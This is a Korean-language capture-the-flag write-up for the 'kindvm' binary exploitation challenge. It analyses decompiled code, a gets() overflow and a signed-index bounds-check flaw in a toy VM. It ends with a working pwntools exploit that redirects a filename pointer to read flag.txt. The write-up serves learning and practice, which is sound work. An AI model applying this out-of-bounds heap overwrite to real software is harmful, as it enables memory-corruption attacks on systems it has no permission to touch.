# index

- [summary](#summary)
- [analysis](#analysis)
- [exploit](#exploit)
- [comment](#comment)



# summary

- vm
- none check `signed` index

- fxxk

# analysis

```css
[*] '/home/m444ndu/round1/kindvm/kindvm'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```



## main()

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  ctf_setup();
  kindvm_setup();
  input_insn();
  (*(void (**)(void))(kc + 16))();              // func_greeting()
  while ( !*(_DWORD *)(kc + 4) )                // until exec halt()
    exec_insn();
  (*(void (**)(void))(kc + 20))();              // func_farewell()
  return 0;
}
```

여러 초기화들을 한 다음, `instruct` 를 입력받고, `halt()` 를 만나기 전까지 실행합니다. (`*(kc+4)` 값은 `halt()` 한 뒤에 0에서 1로 변함으로써 exit flag로 사용됩니다.) 

또한, `func_greeting()`과 `func_farewell()` 모두 `*(kc+12)`에 존재하는 문자열을 파일 이름으로 받아 `open_read_write()` 로 출력해주는 기능을 가졌습니당

### func_greeting() & open_read_write()

```c
ssize_t func_greeting()
{
  open_read_write(*(char **)(kc + 12));
  return write(1, "Instruction start!\n", 0x14u);
}

int __cdecl open_read_write(char *file)
{
  int fd; // ST14_4
  __off_t size; // ST18_4
  void *buf; // ST1C_4

  fd = open(file, 114);
  size = lseek(fd, 0, 2);
  lseek(fd, 0, 0);
  buf = malloc(size);
  read(fd, buf, size);
  write(1, buf, size);
  return close(fd);
}
```

`*(kc+12)`를 바꿀 수 있다면 원하는 파일의 내용을 출력할 수 있을 것 같습니다.



## kindvm_setup()

```c
void *kindvm_setup()
{
  _DWORD *v0; // eax
  int v1; // ebx
  void *result; // eax

  v0 = malloc(0x18u);
  kc = v0;                                      // program counter
  *v0 = 0;
  *(_DWORD *)(kc + 4) = 0;                      // 1 = halt
  v1 = kc;
  *(_DWORD *)(v1 + 8) = input_username();
  *(_DWORD *)(kc + 12) = "banner.txt";
  *(_DWORD *)(kc + 16) = func_greeting;         // *(kc+0xc) read and write
  *(_DWORD *)(kc + 20) = func_farewell;         // *(kc+0xc) read and write
  mem = malloc(0x400u);
  memset(mem, 0, 0x400u);
  reg = malloc(0x20u);
  memset(reg, 0, 0x20u);
  insn = malloc(0x400u);
  result = memset(mem, 65, 0x400u);
  nop = (int *)insn_nop;
  load = (int *)insn_load;                      // *reg = 4bytes
  store = (int *)insn_store;                    // *mem = 4bytes
  mov = (int *)insn_mov;
  add = (int *)insn_add;
  sub = (int *)insn_sub;
  halt = (int *)insn_halt;
  in = (int *)insn_in;
  out = (int *)insn_out;
  hint = (int *)insn_hint;
  return result;
}
```

본 문제의 컨셉인 vm을 구동시키기 위해 가장 중요한 부분입니다. `*(kc+0)`는 `program counter`와 유사한 동작을 할 수 있도록 명령어 및 인자들을 가리키는 `index`로서 사용됩니다. 나머지는 memory, register 및 instruction을 사용할 공간할당과 함수들을 사용하기 위해 초기화해주는 부분입니다.





## input_username()

```c
char *input_username()
{
  char *dest; // ST18_4
  size_t v1; // eax
  char buf; // [esp+12h] [ebp-16h]
  unsigned int v4; // [esp+1Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  printf("Input your name : ");
  gets(&buf);
  dest = (char *)malloc(0xAu);
  v1 = strlen(&buf);
  dest[9] = 0;
  strncpy(dest, &buf, v1);
  return dest;
}
```

사실 이 부분에서 `gets()`로 __bof__ 가 발생합니다. 하지만 **canary leak**을 할 수 없는 시점이어서 `eip` control을 하기는 힘든 상태이고, **top chunk**의 `size`를 건들 수도 없습니다. 저걸로 수작부리는건 포기하고 그냥 `*(kc+12)` 값을 변조시키는 걸 목표로 하는 것이 좋을 것 같습니당



그냥 명령어들을 사용해서 값을 어떻게 변조시킬까 짱구를 굴리던 와중, 취약점 냄새가 나는 부분을 발견했습니다.

```c
int insn_load()
{
  int *dest; // ebx
  int result; // eax
  unsigned __int8 v1; // [esp+Dh] [ebp-Bh]
  __int16 v2; // [esp+Eh] [ebp-Ah]

  v1 = load_insn_uint8_t();
  v2 = load_insn_uint16_t();
  if ( v1 > 7u )
    kindvm_abort();
  if ( v2 > 1020 )
    kindvm_abort();
  dest = (int *)((char *)reg + 4 * v1);
  result = load_mem_uint32_t(v2);
  *dest = result;
  return result;
}

_BYTE *insn_store()
{
  unsigned __int8 v2; // [esp+Dh] [ebp-Bh]
  __int16 v1; // [esp+Eh] [ebp-Ah]

  v1 = load_insn_uint16_t();
  v2 = load_insn_uint8_t();
  if ( v2 > 7u )
    kindvm_abort();
  if ( v1 > 1020 )
    kindvm_abort();
  return store_mem_uint32_t(v1, *((_DWORD *)reg + v2));
}
```

`load`와 `store` 모두 하나의 인자는 **unsigned**로 비교하고, 나머지 인자는 **signed**로 비교합니다. 

해당 인자는 **mem**과 **reg**에 대한 `index` 값입니다. `index`가 음수 값을 가질 경우, **kc_chunk**에 접근이 가능하기 때문에 예외처리를 하는데, `load`와 `store`에서 **mem**에 대한 `index`로 사용하는 값을 **signed int**로 비교하여 **음수 값**에 대한 검사를 진행하지 않습니다.



이제 이를 이용하여 **kc_chunk**의 값을 변조시킬 수 있습니다. 다음은 `exec_insn()`가 실행될 때의 **heap** 상태입니다.

```css
Top Chunk: 0x804c890
Last Remainder: 0

0x804c000 FASTBIN {        <= kc_chunk
  prev_size = 0, 
  size = 33, 
  fd = 0x1, 
  bk = 0x0, 
  fd_nextsize = 0x804c028, 
  bk_nextsize = 0x80491b2
}
0x804c020 FASTBIN {        <= name_chunk
  prev_size = 0, 
  size = 17, 
  fd = 0x67616c66, 
  bk = 0x7478742e, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x409
}
0x804c030 PREV_INUSE {     <= memory_chunk
  prev_size = 0, 
  size = 1033, 
  fd = 0x41414141, 
  bk = 0x41414141, 
  fd_nextsize = 0x41414141, 
  bk_nextsize = 0x41414141
}
0x804c438 FASTBIN {        <= register_chunk
  prev_size = 0, 
  size = 41, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x804c460 PREV_INUSE {     <= instruction_chunk
  prev_size = 0, 
  size = 1033, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x804c868 FASTBIN {        <= func_greeting_chunk
  prev_size = 0, 
  size = 41, 
  fd = 0x62626262, 
  bk = 0x62626262, 
  fd_nextsize = 0x61616162, 
  bk_nextsize = 0x61616161
}
```

`mem-40`(kc+8)은 `name`이 저장된 주소를 나타내고, `mem-36`(kc+12)은 "banner.txt"가 저장된 주소를 나타냅니다. `load`와 `store`를 사용하여 두 값을 바꿔주면 `func_farewell()`이 실행되면서 `name`을 이름으로 하는 파일을 `open_read_write()`을 통해 출력할 수 있습니다. 

`name`에 **"flag.txt"**를 저장하면 플래그를 읽을 수 있게 됩니다.



# exploit

```python
#! /usr/bin/python
from pwn import *

r = process('./kindvm')

payload = 'flag.txt'
r.sendlineafter('Input your name : ',payload)

payload2 = ''
payload2 += '\x01'      # load()  *(reg+0) = *(mem-40)
payload2 += '\x00' 
payload2 += '\xff\xd8'
payload2 += '\x02'      # store() *(mem-36) = *(reg+0)
payload2 += '\xff\xdc'
payload2 += '\x00'
payload2 += '\x06'      # halt()
r.sendlineafter('Input instruction : ',payload2)

r.interactive()
'''
\x00 nop
\x01 load  _8, _16
\x02 store _16, _8
\x03 mov   _8, _8
\x04 add   _8, _8
\x05 sub   _8, _8
\x06 halt  
\x07 in    _8, _32
\x08 out   _8
\x09 hint  
'''

```



# comment

- `hint` 파일이 없었거니와 `insn_add()`의 `hint3()`를 실행시키는 것까지의 과정이 무슨 의미가 있는 건지 잘 모르겠다.

